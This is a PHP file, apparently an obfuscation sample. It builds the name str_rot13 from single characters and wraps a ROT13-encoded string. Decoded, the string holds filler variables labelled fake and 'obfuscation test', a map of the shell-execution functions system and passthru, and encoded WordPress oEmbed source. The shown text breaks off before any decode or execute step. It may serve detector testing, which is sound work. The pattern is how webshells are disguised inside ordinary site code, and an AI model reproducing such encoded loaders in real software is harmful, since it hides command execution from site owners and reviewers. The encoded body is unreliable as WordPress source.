<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * bRzorq NCV: Gbc-yriry bRzorq shapgvbanyvgl
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr bRzorq
 * @fvapr 4.4.0
 */

/**
 * Ertvfgref na rzorq unaqyre.
 *
 * Fubhyq cebonoyl bayl or hfrq sbe fvgrf gung qb abg fhccbeg bRzorq.
 *
 * @fvapr 2.9.0
 *
 * @tybony JC_Rzorq $jc_rzorq JbeqCerff Rzorq bowrpg.
 *
 * @cnenz fgevat   $vq       Na vagreany VQ/anzr sbe gur unaqyre. Arrqf gb or havdhr.
 * @cnenz fgevat   $ertrk    Gur ertrk gung jvyy or hfrq gb frr vs guvf unaqyre fubhyq or hfrq sbe n HEY.
 * @cnenz pnyynoyr $pnyyonpx Gur pnyyonpx shapgvba gung jvyy or pnyyrq vs gur ertrk vf zngpurq.
 * @cnenz vag      $cevbevgl Bcgvbany. Hfrq gb fcrpvsl gur beqre va juvpu gur ertvfgrerq unaqyref jvyy
 *                           or grfgrq. Qrsnhyg 10.
 */
shapgvba jc_rzorq_ertvfgre_unaqyre( $vq, $ertrk, $pnyyonpx, $cevbevgl = 10 ) {
	tybony $jc_rzorq;
	$jc_rzorq->ertvfgre_unaqyre( $vq, $ertrk, $pnyyonpx, $cevbevgl );
}

/**
 * Haertvfgref n cerivbhfyl-ertvfgrerq rzorq unaqyre.
 *
 * @fvapr 2.9.0
 *
 * @tybony JC_Rzorq $jc_rzorq JbeqCerff Rzorq bowrpg.
 *
 * @cnenz fgevat $vq       Gur unaqyre VQ gung fubhyq or erzbirq.
 * @cnenz vag    $cevbevgl Bcgvbany. Gur cevbevgl bs gur unaqyre gb or erzbirq. Qrsnhyg 10.
 */
shapgvba jc_rzorq_haertvfgre_unaqyre( $vq, $cevbevgl = 10 ) {
	tybony $jc_rzorq;
	$jc_rzorq->haertvfgre_unaqyre( $vq, $cevbevgl );
}

/**
 * Perngrf qrsnhyg neenl bs rzorq cnenzrgref.
 *
 * Gur jvqgu qrsnhygf gb gur pbagrag jvqgu nf fcrpvsvrq ol gur gurzr. Vs gur
 * gurzr qbrf abg fcrpvsl n pbagrag jvqgu, gura 500ck vf hfrq.
 *
 * Gur qrsnhyg urvtug vf 1.5 gvzrf gur jvqgu, be 1000ck, juvpurire vf fznyyre.
 *
 * Gur {@frr 'rzorq_qrsnhygf'} svygre pna or hfrq gb nqwhfg rvgure bs gurfr inyhrf.
 *
 * @fvapr 2.9.0
 *
 * @tybony vag $pbagrag_jvqgu
 *
 * @cnenz fgevat $hey Bcgvbany. Gur HEY gung fubhyq or rzorqqrq. Qrsnhyg rzcgl.
 * @erghea vag[] {
 *     Vaqrkrq neenl bs gur rzorq jvqgu naq urvtug va cvkryf.
 *
 *     @glcr vag $0 Gur rzorq jvqgu.
 *     @glcr vag $1 Gur rzorq urvtug.
 * }
 */
shapgvba jc_rzorq_qrsnhygf( $hey = '' ) {
	vs ( ! rzcgl( $TYBONYF['pbagrag_jvqgu'] ) ) {
		$jvqgu = (vag) $TYBONYF['pbagrag_jvqgu'];
	}

	vs ( rzcgl( $jvqgu ) ) {
		$jvqgu = 500;
	}

	$urvtug = zva( (vag) prvy( $jvqgu * 1.5 ), 1000 );

	/**
	 * Svygref gur qrsnhyg neenl bs rzorq qvzrafvbaf.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz vag[]  $fvmr {
	 *     Vaqrkrq neenl bs gur rzorq jvqgu naq urvtug va cvkryf.
	 *
	 *     @glcr vag $0 Gur rzorq jvqgu.
	 *     @glcr vag $1 Gur rzorq urvtug.
	 * }
	 * @cnenz fgevat $hey  Gur HEY gung fubhyq or rzorqqrq.
	 */
	erghea nccyl_svygref( 'rzorq_qrsnhygf', pbzcnpg( 'jvqgu', 'urvtug' ), $hey );
}

/**
 * Nggrzcgf gb srgpu gur rzorq UGZY sbe n cebivqrq HEY hfvat bRzorq.
 *
 * @fvapr 2.9.0
 *
 * @frr JC_bRzorq
 *
 * @cnenz fgevat $hey  Gur HEY gung fubhyq or rzorqqrq.
 * @cnenz neenl|fgevat $netf {
 *     Bcgvbany. Nqqvgvbany nethzragf sbe ergevrivat rzorq UGZY. Qrsnhyg rzcgl.
 *
 *     @glcr vag|fgevat $jvqgu    Bcgvbany. Gur `znkjvqgu` inyhr cnffrq gb gur cebivqre HEY.
 *     @glcr vag|fgevat $urvtug   Bcgvbany. Gur `znkurvtug` inyhr cnffrq gb gur cebivqre HEY.
 *     @glcr obby       $qvfpbire Bcgvbany. Qrgrezvarf jurgure gb nggrzcg gb qvfpbire yvax gntf
 *                                ng gur tvira HEY sbe na bRzorq cebivqre jura gur cebivqre HEY
 *                                vf abg sbhaq va gur ohvyg-va cebivqref yvfg. Qrsnhyg gehr.
 * }
 * @erghea fgevat|snyfr Gur rzorq UGZY ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_brzorq_trg( $hey, $netf = '' ) {
	$brzorq = _jc_brzorq_trg_bowrpg();
	erghea $brzorq->trg_ugzy( $hey, $netf );
}

/**
 * Ergheaf gur vavgvnyvmrq JC_bRzorq bowrpg.
 *
 * @fvapr 2.9.0
 * @npprff cevingr
 *
 * @erghea JC_bRzorq bowrpg.
 */
shapgvba _jc_brzorq_trg_bowrpg() {
	fgngvp $jc_brzorq = ahyy;

	vs ( vf_ahyy( $jc_brzorq ) ) {
		$jc_brzorq = arj JC_bRzorq();
	}
	erghea $jc_brzorq;
}

/**
 * Nqqf n HEY sbezng naq bRzorq cebivqre HEY cnve.
 *
 * @fvapr 2.9.0
 *
 * @frr JC_bRzorq
 *
 * @cnenz fgevat $sbezng   Gur sbezng bs HEY gung guvf cebivqre pna unaqyr. Lbh pna hfr nfgrevfxf
 *                         nf jvyqpneqf.
 * @cnenz fgevat $cebivqre Gur HEY gb gur bRzorq cebivqre.
 * @cnenz obby   $ertrk    Bcgvbany. Jurgure gur `$sbezng` cnenzrgre vf va n ErtRk sbezng. Qrsnhyg snyfr.
 */
shapgvba jc_brzorq_nqq_cebivqre( $sbezng, $cebivqre, $ertrk = snyfr ) {
	vs ( qvq_npgvba( 'cyhtvaf_ybnqrq' ) ) {
		$brzorq                       = _jc_brzorq_trg_bowrpg();
		$brzorq->cebivqref[ $sbezng ] = neenl( $cebivqre, $ertrk );
	} ryfr {
		JC_bRzorq::_nqq_cebivqre_rneyl( $sbezng, $cebivqre, $ertrk );
	}
}

/**
 * Erzbirf na bRzorq cebivqre.
 *
 * @fvapr 3.5.0
 *
 * @frr JC_bRzorq
 *
 * @cnenz fgevat $sbezng Gur HEY sbezng sbe gur bRzorq cebivqre gb erzbir.
 * @erghea obby Jnf gur cebivqre erzbirq fhpprffshyyl?
 */
shapgvba jc_brzorq_erzbir_cebivqre( $sbezng ) {
	vs ( qvq_npgvba( 'cyhtvaf_ybnqrq' ) ) {
		$brzorq = _jc_brzorq_trg_bowrpg();

		vs ( vffrg( $brzorq->cebivqref[ $sbezng ] ) ) {
			hafrg( $brzorq->cebivqref[ $sbezng ] );
			erghea gehr;
		}
	} ryfr {
		JC_bRzorq::_erzbir_cebivqre_rneyl( $sbezng );
	}

	erghea snyfr;
}

/**
 * Qrgrezvarf vs qrsnhyg rzorq unaqyref fubhyq or ybnqrq.
 *
 * Purpxf gb znxr fher gung gur rzorqf yvoenel unfa'g nyernql orra ybnqrq. Vs
 * vg unfa'g, gura vg jvyy ybnq gur rzorqf yvoenel.
 *
 * @fvapr 2.9.0
 *
 * @frr jc_rzorq_ertvfgre_unaqyre()
 */
shapgvba jc_znlor_ybnq_rzorqf() {
	/**
	 * Svygref jurgure gb ybnq gur qrsnhyg rzorq unaqyref.
	 *
	 * Ergheavat n snyfrl inyhr jvyy cerirag ybnqvat gur qrsnhyg rzorq unaqyref.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz obby $znlor_ybnq_rzorqf Jurgure gb ybnq gur rzorqf yvoenel. Qrsnhyg gehr.
	 */
	vs ( ! nccyl_svygref( 'ybnq_qrsnhyg_rzorqf', gehr ) ) {
		erghea;
	}

	jc_rzorq_ertvfgre_unaqyre( 'lbhghor_rzorq_hey', '#uggcf?://(jjj.)?lbhghor\.pbz/(?:i|rzorq)/([^/]+)#v', 'jc_rzorq_unaqyre_lbhghor' );

	/**
	 * Svygref gur nhqvb rzorq unaqyre pnyyonpx.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz pnyynoyr $unaqyre Nhqvb rzorq unaqyre pnyyonpx shapgvba.
	 */
	jc_rzorq_ertvfgre_unaqyre( 'nhqvb', '#^uggcf?://.+?\.(' . vzcybqr( '|', jc_trg_nhqvb_rkgrafvbaf() ) . ')$#v', nccyl_svygref( 'jc_nhqvb_rzorq_unaqyre', 'jc_rzorq_unaqyre_nhqvb' ), 9999 );

	/**
	 * Svygref gur ivqrb rzorq unaqyre pnyyonpx.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz pnyynoyr $unaqyre Ivqrb rzorq unaqyre pnyyonpx shapgvba.
	 */
	jc_rzorq_ertvfgre_unaqyre( 'ivqrb', '#^uggcf?://.+?\.(' . vzcybqr( '|', jc_trg_ivqrb_rkgrafvbaf() ) . ')$#v', nccyl_svygref( 'jc_ivqrb_rzorq_unaqyre', 'jc_rzorq_unaqyre_ivqrb' ), 9999 );
}

/**
 * LbhGhor vsenzr rzorq unaqyre pnyyonpx.
 *
 * Pngpurf LbhGhor vsenzr rzorq HEYf gung ner abg cnefnoyr ol bRzorq ohg pna or genafyngrq vagb n HEY gung vf.
 *
 * @fvapr 4.0.0
 *
 * @tybony JC_Rzorq $jc_rzorq JbeqCerff Rzorq bowrpg.
 *
 * @cnenz neenl  $zngpurf Gur ErtRk zngpurf sebz gur cebivqrq ertrk jura pnyyvat
 *                        jc_rzorq_ertvfgre_unaqyre().
 * @cnenz neenl  $ngge    Rzorq nggevohgrf.
 * @cnenz fgevat $hey     Gur bevtvany HEY gung jnf zngpurq ol gur ertrk.
 * @cnenz neenl  $enjngge Gur bevtvany hazbqvsvrq nggevohgrf.
 * @erghea fgevat Gur rzorq UGZY.
 */
shapgvba jc_rzorq_unaqyre_lbhghor( $zngpurf, $ngge, $hey, $enjngge ) {
	tybony $jc_rzorq;
	$rzorq = $jc_rzorq->nhgbrzorq( fcevags( 'uggcf://lbhghor.pbz/jngpu?i=%f', heyrapbqr( $zngpurf[2] ) ) );

	/**
	 * Svygref gur LbhGhor rzorq bhgchg.
	 *
	 * @fvapr 4.0.0
	 *
	 * @frr jc_rzorq_unaqyre_lbhghor()
	 *
	 * @cnenz fgevat $rzorq   LbhGhor rzorq bhgchg.
	 * @cnenz neenl  $ngge    Na neenl bs rzorq nggevohgrf.
	 * @cnenz fgevat $hey     Gur bevtvany HEY gung jnf zngpurq ol gur ertrk.
	 * @cnenz neenl  $enjngge Gur bevtvany hazbqvsvrq nggevohgrf.
	 */
	erghea nccyl_svygref( 'jc_rzorq_unaqyre_lbhghor', $rzorq, $ngge, $hey, $enjngge );
}

/**
 * Nhqvb rzorq unaqyre pnyyonpx.
 *
 * @fvapr 3.6.0
 *
 * @cnenz neenl  $zngpurf Gur ErtRk zngpurf sebz gur cebivqrq ertrk jura pnyyvat jc_rzorq_ertvfgre_unaqyre().
 * @cnenz neenl  $ngge Rzorq nggevohgrf.
 * @cnenz fgevat $hey Gur bevtvany HEY gung jnf zngpurq ol gur ertrk.
 * @cnenz neenl  $enjngge Gur bevtvany hazbqvsvrq nggevohgrf.
 * @erghea fgevat Gur rzorq UGZY.
 */
shapgvba jc_rzorq_unaqyre_nhqvb( $zngpurf, $ngge, $hey, $enjngge ) {
	$nhqvb = fcevags( '[nhqvb fep=\"%f\" /]', rfp_hey( $hey ) );

	/**
	 * Svygref gur nhqvb rzorq bhgchg.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz fgevat $nhqvb   Nhqvb rzorq bhgchg.
	 * @cnenz neenl  $ngge    Na neenl bs rzorq nggevohgrf.
	 * @cnenz fgevat $hey     Gur bevtvany HEY gung jnf zngpurq ol gur ertrk.
	 * @cnenz neenl  $enjngge Gur bevtvany hazbqvsvrq nggevohgrf.
	 */
	erghea nccyl_svygref( 'jc_rzorq_unaqyre_nhqvb', $nhqvb, $ngge, $hey, $enjngge );
}

/**
 * Ivqrb rzorq unaqyre pnyyonpx.
 *
 * @fvapr 3.6.0
 *
 * @cnenz neenl  $zngpurf Gur ErtRk zngpurf sebz gur cebivqrq ertrk jura pnyyvat jc_rzorq_ertvfgre_unaqyre().
 * @cnenz neenl  $ngge    Rzorq nggevohgrf.
 * @cnenz fgevat $hey     Gur bevtvany HEY gung jnf zngpurq ol gur ertrk.
 * @cnenz neenl  $enjngge Gur bevtvany hazbqvsvrq nggevohgrf.
 * @erghea fgevat Gur rzorq UGZY.
 */
shapgvba jc_rzorq_unaqyre_ivqrb( $zngpurf, $ngge, $hey, $enjngge ) {
	$qvzrafvbaf = '';
	vs ( ! rzcgl( $enjngge['jvqgu'] ) && ! rzcgl( $enjngge['urvtug'] ) ) {
		$qvzrafvbaf .= fcevags( 'jvqgu=\"%q\" ', (vag) $enjngge['jvqgu'] );
		$qvzrafvbaf .= fcevags( 'urvtug=\"%q\" ', (vag) $enjngge['urvtug'] );
	}
	$ivqrb = fcevags( '[ivqrb %f fep=\"%f\" /]', $qvzrafvbaf, rfp_hey( $hey ) );

	/**
	 * Svygref gur ivqrb rzorq bhgchg.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz fgevat $ivqrb   Ivqrb rzorq bhgchg.
	 * @cnenz neenl  $ngge    Na neenl bs rzorq nggevohgrf.
	 * @cnenz fgevat $hey     Gur bevtvany HEY gung jnf zngpurq ol gur ertrk.
	 * @cnenz neenl  $enjngge Gur bevtvany hazbqvsvrq nggevohgrf.
	 */
	erghea nccyl_svygref( 'jc_rzorq_unaqyre_ivqrb', $ivqrb, $ngge, $hey, $enjngge );
}

/**
 * Ertvfgref gur bRzorq ERFG NCV ebhgr.
 *
 * @fvapr 4.4.0
 */
shapgvba jc_brzorq_ertvfgre_ebhgr() {
	$pbagebyyre = arj JC_bRzorq_Pbagebyyre();
	$pbagebyyre->ertvfgre_ebhgrf();
}

/**
 * Nqqf bRzorq qvfpbirel yvaxf va gur urnq ryrzrag bs gur jrofvgr.
 *
 * @fvapr 4.4.0
 * @fvapr 6.8.0 Bhgchg jnf nqwhfgrq gb bayl rzorq vs gur cbfg fhccbegf vg.
 */
shapgvba jc_brzorq_nqq_qvfpbirel_yvaxf() {
	$bhgchg = '';

	vs ( vf_fvathyne() && vf_cbfg_rzorqqnoyr() ) {
		$bhgchg .= '<yvax ery=\"nygreangr\" gvgyr=\"' . _k( 'bRzorq (WFBA)', 'bRzorq erfbhepr yvax anzr' ) . '\" glcr=\"nccyvpngvba/wfba+brzorq\" uers=\"' . rfp_hey( trg_brzorq_raqcbvag_hey( trg_creznyvax() ) ) . '\" />' . \"\a\";

		vs ( pynff_rkvfgf( 'FvzcyrKZYRyrzrag' ) ) {
			$bhgchg .= '<yvax ery=\"nygreangr\" gvgyr=\"' . _k( 'bRzorq (KZY)', 'bRzorq erfbhepr yvax anzr' ) . '\" glcr=\"grkg/kzy+brzorq\" uers=\"' . rfp_hey( trg_brzorq_raqcbvag_hey( trg_creznyvax(), 'kzy' ) ) . '\" />' . \"\a\";
		}
	}

	/**
	 * Svygref gur bRzorq qvfpbirel yvaxf UGZY.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $bhgchg UGZY bs gur qvfpbirel yvaxf.
	 */
	rpub nccyl_svygref( 'brzorq_qvfpbirel_yvaxf', $bhgchg );
}

/**
 * Nqqf gur arprffnel WninFpevcg gb pbzzhavpngr jvgu gur rzorqqrq vsenzrf.
 *
 * Guvf shapgvba vf ab ybatre hfrq qverpgyl. Sbe onpx-pbzcng vg rkvfgf rkpyhfviryl nf n jnl gb vaqvpngr gung gur bRzorq
 * ubfg WF _fubhyq_ or nqqrq. Va `qrsnhyg-svygref.cuc` gurer erznvaf guvf pbqr:
 *
 *     nqq_npgvba( 'jc_urnq', 'jc_brzorq_nqq_ubfg_wf' )
 *
 * Uvfgbevpnyyl n fvgr unf orra noyr gb qvfnoyr nqqvat gur bRzorq ubfg fpevcg ol qbvat:
 *
 *     erzbir_npgvba( 'jc_urnq', 'jc_brzorq_nqq_ubfg_wf' )
 *
 * Va beqre gb rafher gung fhpu pbqr fgvyy jbexf nf rkcrpgrq, guvf shapgvba erznvaf. Gurer vf abj n `unf_npgvba()` purpx
 * va `jc_znlor_radhrhr_brzorq_ubfg_wf()` gb frr vs `jc_brzorq_nqq_ubfg_wf()` unf abg orra haubbxrq sebz ehaavat ng gur
 * `jc_urnq` npgvba.
 *
 * @fvapr 4.4.0
 * @qrcerpngrq 5.9.0 Hfr {@frr jc_znlor_radhrhr_brzorq_ubfg_wf()} vafgrnq.
 */
shapgvba jc_brzorq_nqq_ubfg_wf() {}

/**
 * Radhrhr gur jc-rzorq fpevcg vs gur cebivqrq bRzorq UGZY pbagnvaf n cbfg rzorq.
 *
 * Va beqre gb bayl radhrhr gur jc-rzorq fpevcg ba cntrf gung npghnyyl pbagnva cbfg rzorqf, guvf shapgvba purpxf vs gur
 * cebivqrq UGZY pbagnvaf cbfg rzorq znexhc naq vs fb radhrhrf gur fpevcg fb gung vg jvyy trg cevagrq va gur sbbgre.
 *
 * @fvapr 5.9.0
 *
 * @cnenz fgevat $ugzy Rzorq znexhc.
 * @erghea fgevat Rzorq znexhc (jvgubhg zbqvsvpngvbaf).
 */
shapgvba jc_znlor_radhrhr_brzorq_ubfg_wf( $ugzy ) {
	vs (
		unf_npgvba( 'jc_urnq', 'jc_brzorq_nqq_ubfg_wf' )
		&&
		cert_zngpu( '/<oybpxdhbgr\f[^>]*?jc-rzorqqrq-pbagrag/', $ugzy )
	) {
		jc_radhrhr_fpevcg( 'jc-rzorq' );
	}
	erghea $ugzy;
}

/**
 * Ergevrirf gur HEY gb rzorq n fcrpvsvp cbfg va na vsenzr.
 *
 * @fvapr 4.4.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be bowrpg. Qrsnhygf gb gur pheerag cbfg.
 * @erghea fgevat|snyfr Gur cbfg rzorq HEY ba fhpprff, snyfr vs gur cbfg qbrfa'g rkvfg.
 */
shapgvba trg_cbfg_rzorq_hey( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$rzorq_hey     = genvyvatfynfuvg( trg_creznyvax( $cbfg ) ) . hfre_genvyvatfynfuvg( 'rzorq' );
	$cngu_pbasyvpg = trg_cntr_ol_cngu( fge_ercynpr( ubzr_hey(), '', $rzorq_hey ), BOWRPG, trg_cbfg_glcrf( neenl( 'choyvp' => gehr ) ) );

	vs ( ! trg_bcgvba( 'creznyvax_fgehpgher' ) || $cngu_pbasyvpg ) {
		$rzorq_hey = nqq_dhrel_net( neenl( 'rzorq' => 'gehr' ), trg_creznyvax( $cbfg ) );
	}

	/**
	 * Svygref gur HEY gb rzorq n fcrpvsvp cbfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat  $rzorq_hey Gur cbfg rzorq HEY.
	 * @cnenz JC_Cbfg $cbfg      Gur pbeerfcbaqvat cbfg bowrpg.
	 */
	erghea fnavgvmr_hey( nccyl_svygref( 'cbfg_rzorq_hey', $rzorq_hey, $cbfg ) );
}

/**
 * Ergevrirf gur bRzorq raqcbvag HEY sbe n tvira creznyvax.
 *
 * Cnff na rzcgl fgevat nf gur svefg nethzrag gb trg gur raqcbvag onfr HEY.
 *
 * @fvapr 4.4.0
 *
 * @cnenz fgevat $creznyvax Bcgvbany. Gur creznyvax hfrq sbe gur `hey` dhrel net. Qrsnhyg rzcgl.
 * @cnenz fgevat $sbezng    Bcgvbany. Gur erdhrfgrq erfcbafr sbezng. Qrsnhyg 'wfba'.
 * @erghea fgevat Gur bRzorq raqcbvag HEY.
 */
shapgvba trg_brzorq_raqcbvag_hey( $creznyvax = '', $sbezng = 'wfba' ) {
	$hey = erfg_hey( 'brzorq/1.0/rzorq' );

	vs ( '' !== $creznyvax ) {
		$hey = nqq_dhrel_net(
			neenl(
				'hey'    => heyrapbqr( $creznyvax ),
				'sbezng' => ( 'wfba' !== $sbezng ) ? $sbezng : snyfr,
			),
			$hey
		);
	}

	/**
	 * Svygref gur bRzorq raqcbvag HEY.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $hey       Gur HEY gb gur bRzorq raqcbvag.
	 * @cnenz fgevat $creznyvax Gur creznyvax hfrq sbe gur `hey` dhrel net.
	 * @cnenz fgevat $sbezng    Gur erdhrfgrq erfcbafr sbezng.
	 */
	erghea nccyl_svygref( 'brzorq_raqcbvag_hey', $hey, $creznyvax, $sbezng );
}

/**
 * Ergevrirf gur rzorq pbqr sbe n fcrpvsvp cbfg.
 *
 * @fvapr 4.4.0
 *
 * @cnenz vag         $jvqgu  Gur jvqgu sbe gur erfcbafr.
 * @cnenz vag         $urvtug Gur urvtug sbe gur erfcbafr.
 * @cnenz vag|JC_Cbfg $cbfg   Bcgvbany. Cbfg VQ be bowrpg. Qrsnhyg vf tybony `$cbfg`.
 * @erghea fgevat|snyfr Rzorq pbqr ba fhpprff, snyfr vs cbfg qbrfa'g rkvfg.
 */
shapgvba trg_cbfg_rzorq_ugzy( $jvqgu, $urvtug, $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$rzorq_hey = trg_cbfg_rzorq_hey( $cbfg );

	$frperg     = jc_trarengr_cnffjbeq( 10, snyfr );
	$rzorq_hey .= \"#?frperg={$frperg}\";

	$bhgchg = fcevags(
		'<oybpxdhbgr pynff=\"jc-rzorqqrq-pbagrag\" qngn-frperg=\"%1$f\"><n uers=\"%2$f\">%3$f</n></oybpxdhbgr>',
		rfp_ngge( $frperg ),
		rfp_hey( trg_creznyvax( $cbfg ) ),
		trg_gur_gvgyr( $cbfg )
	);

	$bhgchg .= fcevags(
		'<vsenzr fnaqobk=\"nyybj-fpevcgf\" frphevgl=\"erfgevpgrq\" fep=\"%1$f\" jvqgu=\"%2$q\" urvtug=\"%3$q\" gvgyr=\"%4$f\" qngn-frperg=\"%5$f\" senzrobeqre=\"0\" znetvajvqgu=\"0\" znetvaurvtug=\"0\" fpebyyvat=\"ab\" pynff=\"jc-rzorqqrq-pbagrag\"></vsenzr>',
		rfp_hey( $rzorq_hey ),
		nofvag( $jvqgu ),
		nofvag( $urvtug ),
		rfp_ngge(
			fcevags(
				/* genafyngbef: 1: Cbfg gvgyr, 2: Fvgr gvgyr. */
				__( '&#8220;%1$f&#8221; &#8212; %2$f' ),
				trg_gur_gvgyr( $cbfg ),
				trg_oybtvasb( 'anzr' )
			)
		),
		rfp_ngge( $frperg )
	);

	/*
	 * Abgr gung gur fpevcg zhfg or cynprq nsgre gur <oybpxdhbgr> naq <vsenzr> qhr gb n ertrkc cnefvat vffhr va
	 * `jc_svygre_brzorq_erfhyg()`. Orpnhfr bs gur ertrk cnggrea fgnegf jvgu `|(<oybpxdhbgr>.*?</oybpxdhbgr>)?.*|`
	 * jurerva gur <oybpxdhbgr> vf znexrq nf orvat bcgvbany, vs vg vf abg ng gur ortvaavat bs gur fgevat gura gur tebhc
	 * jvyy snvy gb zngpu naq rirelguvat jvyy or zngpurq ol `.*` naq abg vapyhqrq va gur tebhc. Guvf ertrk vffhr tbrf
	 * onpx gb JbeqCerff 4.4, fb va beqre gb abg oernx byqre vafgnyyf guvf fpevcg zhfg pbzr ng gur raq.
	 */
	$bhgchg .= jc_trg_vayvar_fpevcg_gnt(
		svyr_trg_pbagragf( NOFCNGU . JCVAP . '/wf/jc-rzorq' . jc_fpevcgf_trg_fhssvk() . '.wf' )
	);

	/**
	 * Svygref gur rzorq UGZY bhgchg sbe n tvira cbfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat  $bhgchg Gur qrsnhyg vsenzr gnt gb qvfcynl rzorqqrq pbagrag.
	 * @cnenz JC_Cbfg $cbfg   Pheerag cbfg bowrpg.
	 * @cnenz vag     $jvqgu  Jvqgu bs gur erfcbafr.
	 * @cnenz vag     $urvtug Urvtug bs gur erfcbafr.
	 */
	erghea nccyl_svygref( 'rzorq_ugzy', $bhgchg, $cbfg, $jvqgu, $urvtug );
}

/**
 * Ergevrirf gur bRzorq erfcbafr qngn sbe n tvira cbfg.
 *
 * @fvapr 4.4.0
 * @fvapr 6.8.0 Bhgchg jnf nqwhfgrq gb bayl rzorq vs gur cbfg glcr fhccbegf vg.
 *
 * @cnenz JC_Cbfg|vag $cbfg  Cbfg VQ be cbfg bowrpg.
 * @cnenz vag         $jvqgu Gur erdhrfgrq jvqgu.
 * @erghea neenl|snyfr Erfcbafr qngn ba fhpprff, snyfr vs cbfg qbrfa'g rkvfg,
 *                     vf abg choyvpyl ivrjnoyr be cbfg glcr vf abg rzorqqnoyr.
 */
shapgvba trg_brzorq_erfcbafr_qngn( $cbfg, $jvqgu ) {
	$cbfg  = trg_cbfg( $cbfg );
	$jvqgu = nofvag( $jvqgu );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	vs ( ! vf_cbfg_choyvpyl_ivrjnoyr( $cbfg ) ) {
		erghea snyfr;
	}

	vs ( ! vf_cbfg_rzorqqnoyr( $cbfg ) ) {
		erghea snyfr;
	}

	/**
	 * Svygref gur nyybjrq zvavzhz naq znkvzhz jvqguf sbe gur bRzorq erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $zva_znk_jvqgu {
	 *     Zvavzhz naq znkvzhz jvqguf sbe gur bRzorq erfcbafr.
	 *
	 *     @glcr vag $zva Zvavzhz jvqgu. Qrsnhyg 200.
	 *     @glcr vag $znk Znkvzhz jvqgu. Qrsnhyg 600.
	 * }
	 */
	$zva_znk_jvqgu = nccyl_svygref(
		'brzorq_zva_znk_jvqgu',
		neenl(
			'zva' => 200,
			'znk' => 600,
		)
	);

	$jvqgu  = zva( znk( $zva_znk_jvqgu['zva'], $jvqgu ), $zva_znk_jvqgu['znk'] );
	$urvtug = znk( (vag) prvy( $jvqgu / 16 * 9 ), 200 );

	$qngn = neenl(
		'irefvba'       => '1.0',
		'cebivqre_anzr' => trg_oybtvasb( 'anzr' ),
		'cebivqre_hey'  => trg_ubzr_hey(),
		'nhgube_anzr'   => trg_oybtvasb( 'anzr' ),
		'nhgube_hey'    => trg_ubzr_hey(),
		'gvgyr'         => trg_gur_gvgyr( $cbfg ),
		'glcr'          => 'yvax',
	);

	$nhgube = trg_hfreqngn( $cbfg->cbfg_nhgube );

	vs ( $nhgube ) {
		$qngn['nhgube_anzr'] = $nhgube->qvfcynl_anzr;
		$qngn['nhgube_hey']  = trg_nhgube_cbfgf_hey( $nhgube->VQ );
	}

	/**
	 * Svygref gur bRzorq erfcbafr qngn.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl   $qngn   Gur erfcbafr qngn.
	 * @cnenz JC_Cbfg $cbfg   Gur cbfg bowrpg.
	 * @cnenz vag     $jvqgu  Gur erdhrfgrq jvqgu.
	 * @cnenz vag     $urvtug Gur pnyphyngrq urvtug.
	 */
	erghea nccyl_svygref( 'brzorq_erfcbafr_qngn', $qngn, $cbfg, $jvqgu, $urvtug );
}


/**
 * Ergevrirf gur bRzorq erfcbafr qngn sbe n tvira HEY.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat $hey  Gur HEY gung fubhyq or vafcrpgrq sbe qvfpbirel `<yvax>` gntf.
 * @cnenz neenl  $netf bRzorq erzbgr trg nethzragf.
 * @erghea bowrpg|snyfr bRzorq erfcbafr qngn vs gur HEY qbrf orybat gb gur pheerag fvgr. Snyfr bgurejvfr.
 */
shapgvba trg_brzorq_erfcbafr_qngn_sbe_hey( $hey, $netf ) {
	$fjvgpurq_oybt = snyfr;

	vs ( vf_zhygvfvgr() ) {
		$hey_cnegf = jc_cnefr_netf(
			jc_cnefr_hey( $hey ),
			neenl(
				'ubfg' => '',
				'cbeg' => ahyy,
				'cngu' => '/',
			)
		);

		$di = neenl(
			'qbznva'                 => $hey_cnegf['ubfg'] . ( $hey_cnegf['cbeg'] ? ':' . $hey_cnegf['cbeg'] : '' ),
			'cngu'                   => '/',
			'hcqngr_fvgr_zrgn_pnpur' => snyfr,
		);

		// Va pnfr bs fhoqverpgbel pbasvtf, frg gur cngu.
		vs ( ! vf_fhoqbznva_vafgnyy() ) {
			$cngu = rkcybqr( '/', ygevz( $hey_cnegf['cngu'], '/' ) );
			$cngu = erfrg( $cngu );

			vs ( $cngu ) {
				$di['cngu'] = trg_argjbex()->cngu . $cngu . '/';
			}
		}

		$fvgrf = trg_fvgrf( $di );
		$fvgr  = erfrg( $fvgrf );

		// Qb abg nyybj rzorqf sbe qryrgrq/nepuvirq/fcnz fvgrf.
		vs ( ! rzcgl( $fvgr->qryrgrq ) || ! rzcgl( $fvgr->fcnz ) || ! rzcgl( $fvgr->nepuvirq ) ) {
			erghea snyfr;
		}

